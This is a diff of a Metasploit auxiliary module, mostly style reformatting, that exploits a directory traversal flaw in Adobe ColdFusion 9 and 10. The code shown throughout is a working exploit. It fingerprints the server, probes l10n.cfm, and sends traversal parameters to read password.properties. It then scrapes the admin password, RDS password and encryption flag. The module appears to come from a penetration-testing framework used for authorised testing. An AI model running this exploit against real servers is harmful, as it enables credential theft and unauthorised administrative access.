@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,118 +7,114 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => "ColdFusion 'password.properties' Hash Extraction",
-      'Description'    => %q{
-          This module uses a directory traversal vulnerability to extract information
-        such as password, rdspassword, and "encrypted" properties. This module has been
-        tested successfully on ColdFusion 9 and ColdFusion 10. Use actions to select the
-        target ColdFusion version.
-      },
-      'References'     =>
-        [
-          [ 'OSVDB', '93114' ],
-          [ 'EDB', '25305' ]
-        ],
-      'Author'         =>
-        [
-          'HTP',
-          'sinn3r',
-          'nebulus'
-        ],
-      'License'        => MSF_LICENSE,
-      'Actions'     =>
-        [
-          ['ColdFusion10'],
-          ['ColdFusion9']
-        ],
-      'DefaultAction' => 'ColdFusion10',
-      'DisclosureDate' => "May 7 2013"  #The day we saw the subzero poc
-    ))
+                      'Name'           => "ColdFusion 'password.properties' Hash Extraction",
+                      'Description'    => %q(
+                          This module uses a directory traversal vulnerability to extract information
+                        such as password, rdspassword, and "encrypted" properties. This module has been
+                        tested successfully on ColdFusion 9 and ColdFusion 10. Use actions to select the
+                        target ColdFusion version.
+                      ),
+                      'References'     =>
+                        [
+                          [ 'OSVDB', '93114' ],
+                          [ 'EDB', '25305' ]
+                        ],
+                      'Author'         =>
+                        [
+                          'HTP',
+                          'sinn3r',
+                          'nebulus'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'Actions' =>
+                        [
+                          ['ColdFusion10'],
+                          ['ColdFusion9']
+                        ],
+                      'DefaultAction' => 'ColdFusion10',
+                      'DisclosureDate' => "May 7 2013") # The day we saw the subzero poc)
 
     register_options(
       [
         Opt::RPORT(80),
         OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def fingerprint(response)
-
-    if(response.headers.has_key?('Server') )
-      if(response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\(Windows/)
-        os = "Windows (#{response.headers['Server']})"
-      elsif(response.headers['Server'] =~ /Apache\//)
-          os = "Unix (#{response.headers['Server']})"
-      else
-        os = response.headers['Server']
-      end
+    if response.headers.key?('Server')
+      os = if response.headers['Server'] =~ /IIS/ || response.headers['Server'] =~ /\(Windows/
+             "Windows (#{response.headers['Server']})"
+           elsif response.headers['Server'] =~ /Apache\//
+        "Unix (#{response.headers['Server']})"
+           else
+        response.headers['Server']
+           end
     end
 
     return nil if response.body.length < 100
 
     title = "Not Found"
     response.body.gsub!(/[\r\n]/, '')
-    if(response.body =~ /<title.*\/?>(.+)<\/title\/?>/i)
-      title = $1
+    if response.body =~ /<title.*\/?>(.+)<\/title\/?>/i
+      title = Regexp.last_match(1)
       title.gsub!(/\s/, '')
     end
-    return nil  if( title == 'Not Found' or not title =~ /ColdFusionAdministrator/)
+    return nil if (title == 'Not Found') || (!(title =~ /ColdFusionAdministrator/))
 
     out = nil
 
-    if(response.body =~ />\s*Version:\s*(.*)<\/strong\><br\s\//)
-      v = $1
-      out = (v =~ /^6/) ? "Adobe ColdFusion MX6 (Not Vulnerable)" : "Adobe ColdFusion MX7 (Not Vulnerable)"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/ )
+    if response.body =~ />\s*Version:\s*(.*)<\/strong\><br\s\//
+      v = Regexp.last_match(1)
+      out = v =~ /^6/ ? "Adobe ColdFusion MX6 (Not Vulnerable)" : "Adobe ColdFusion MX7 (Not Vulnerable)"
+    elsif response.body =~ /<meta name=\"Author\" content=\"Copyright 1995-2012 Adobe/ && response.body =~ /Administrator requires a browser that supports frames/
       out = "Adobe ColdFusion MX7 (Not Vulnerable)"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/)
+    elsif response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/
       out = "Adobe ColdFusion 8 (Not Vulnerable)"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2010 Adobe/ and
-      response.body =~ /1997\-2012 Adobe Systems Incorporated and its licensors/)
+    elsif response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2010 Adobe/ &&
+      response.body =~ /1997\-2012 Adobe Systems Incorporated and its licensors/
       out = "Adobe ColdFusion 10"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/ or
-      response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2009 Adobe Systems\, Inc\. All rights reserved/)
+    elsif response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/ ||
+      response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2009 Adobe Systems\, Inc\. All rights reserved/
       out = "Adobe ColdFusion 9"
-    elsif(response.body =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/)
-      out = $1.split(/,/)[0]
+    elsif response.body =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/
+      out = Regexp.last_match(1).split(/,/)[0]
     else
       out = 'Unknown ColdFusion'
     end
 
-    if(title.downcase == 'coldfusionadministrator')
+    if title.casecmp('coldfusionadministrator').zero?
       out << " (you have administrator access)"
     end
 
     out << " (#{os})"
     file = ''
     trav = ''
-    if(os =~ /Windows/ )
+    if os =~ /Windows/
       trav = '..\..\..\..\..\..\..\..\..\..'
-      file = (out =~ /ColdFusion 9/) ? '\ColdFusion9\lib\password.properties' : '\ColdFusion10\CFusion\lib\password.properties'
+      file = out =~ /ColdFusion 9/ ? '\ColdFusion9\lib\password.properties' : '\ColdFusion10\CFusion\lib\password.properties'
     else
       trav = '../../../../../../../../../..'
-      file = (out =~ /ColdFusion 9/) ? '/opt/coldfusion9/lib/password.properties' : '/opt/coldfusion10/cfusion/lib/password.properties'
+      file = out =~ /ColdFusion 9/ ? '/opt/coldfusion9/lib/password.properties' : '/opt/coldfusion10/cfusion/lib/password.properties'
     end
 
-    if(response.body =~ /Adobe/ and response.body =~ /ColdFusion/ and file == '')
+    if response.body =~ /Adobe/ && response.body =~ /ColdFusion/ && (file == '')
       print_error("#{peer} Fingerprint failed...aborting")
       print_status("response: #{response.body}")
-      return nil,nil
+      return nil, nil
     end
 
-    return out,"#{trav}#{file}"
+    [out, "#{trav}#{file}"]
   end
 
   def check
-    if check_cf
-      return Msf::Exploit::CheckCode::Vulnerable
-    end
+    return Msf::Exploit::CheckCode::Vulnerable if check_cf
 
     Msf::Exploit::CheckCode::Safe
   end
@@ -125,70 +122,62 @@ class MetasploitModule < Msf::Auxiliary
   def check_cf
     vuln = false
     url = '/CFIDE/adminapi/customtags/l10n.cfm'
-    res = send_request_cgi({
-        'uri' => url,
-        'method' => 'GET',
-        'Connection' => "keep-alive",
-        'Accept-Encoding' => "zip,deflate",
-        })
+    res = send_request_cgi('uri' => url,
+                                                        'method' => 'GET',
+                                                        'Connection' => "keep-alive",
+                                                        'Accept-Encoding' => "zip,deflate")
 
-    if(res != nil)
-    # can't stack b/c res.code won't exist if res is nil
-      vuln = true if(res.code == 500 and res.body =~ /attributes\.id was not provided/)
+    unless res.nil?
+      # can't stack b/c res.code won't exist if res is nil
+      vuln = true if (res.code == 500) && res.body =~ /attributes\.id was not provided/
     end
 
-    if(vuln)
+    if vuln
       url = '/CFIDE/administrator/mail/download.cfm'
-      res = send_request_cgi({
-          'uri' => url,
-          'method' => 'GET',
-          'Connection' => "keep-alive",
-          'Accept-Encoding' => "zip,deflate",
-          })
-      if(res != nil)
-        vuln = false if (res.code != 200)
+      res = send_request_cgi('uri' => url,
+                                                            'method' => 'GET',
+                                                            'Connection' => "keep-alive",
+                                                            'Accept-Encoding' => "zip,deflate")
+      unless res.nil?
+        vuln = false if res.code != 200
       end
     end
 
-    return vuln
+    vuln
   end
-
 
   def run
     filename = ""
 
     url = '/CFIDE/administrator/index.cfm'
     # print_status("Getting index...")
-    res = send_request_cgi({
-        'uri' => url,
-        'method' => 'GET',
-        'Connection' => "keep-alive",
-        'Accept-Encoding' => "zip,deflate",
-        })
+    res = send_request_cgi('uri' => url,
+                                                        'method' => 'GET',
+                                                        'Connection' => "keep-alive",
+                                                        'Accept-Encoding' => "zip,deflate")
     # print_status("Got back: #{res.inspect}")
-    return if not res
-    return if not res.body or not res.code
-    return if not res.code.to_i == 200
+    return unless res
+    return if !res.body || !res.code
+    return unless res.code.to_i == 200
 
     out, filename = fingerprint(res)
     print_status("#{peer} #{out}") if out
 
-    if(out =~ /Not Vulnerable/)
+    if out =~ /Not Vulnerable/
       print_status("#{peer} isn't vulnerable to this attack")
       return
     end
 
-    if(not check_cf)
+    unless check_cf
       print_status("#{peer} can't be exploited (either files missing or permissions block access)")
       return
     end
 
-    res = send_request_cgi({
-      'method'   => 'GET',
-      'uri'      => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
-      'encode_params' => false,
-      'encode' => false,
-      'vars_get' => {
+    res = send_request_cgi('method' => 'GET',
+                                                        'uri' => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
+                                                        'encode_params' => false,
+                                                        'encode' => false,
+                                                        'vars_get' => {
         'attributes.id'            => 'it',
         'attributes.file'          => '../../administrator/mail/download.cfm',
         'filename'                 => filename,
@@ -199,8 +188,7 @@ class MetasploitModule < Msf::Auxiliary
         'attributes.charset'       => 'UTF-8',
         'thisTag.executionmode'    => 'end',
         'thisTag.generatedContent' => 'htp'
-      }
-    })
+      })
 
     if res.nil?
       print_error("Unable to receive a response")
@@ -211,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
     password  = res.body.scan(/^password=(.+)/).flatten[0]    || ''
     encrypted = res.body.scan(/^encrypted=(.+)/).flatten[0]   || ''
 
-    if rdspass.empty? and password.empty?
+    if rdspass.empty? && password.empty?
       # No pass collected, no point to store anything
       print_error("No passwords found")
       return
